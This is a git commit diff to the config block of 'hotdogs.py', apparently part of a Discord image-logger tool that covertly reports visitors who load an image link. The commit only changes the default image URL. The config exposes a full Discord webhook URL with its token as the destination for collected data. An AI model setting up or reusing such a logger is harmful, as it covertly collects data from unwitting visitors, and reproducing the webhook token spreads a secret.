d2f67df3cab6f98dea521053b7b69621efa95149
Neformation <130835156+kerem123216@users.noreply.github.com>
2024-04-15 05:53:21 +0300

    Update hotdogs.py

--- api/hotdogs.py
+++ api/hotdogs.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1229260184610799686/kmMoiOZTuqbhQsrz_G7pD1Zg_5N48DszOtaYGS51rWmAQe2ApaXurBNFDktG6sMb88Ba",
-    "image": "https://hotdogi.vercel.app/Hotdog.png", # You can also have a custom image by using a URL argument
+    "image": "https://hotdogi.vercel.app/api/Hotdog.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
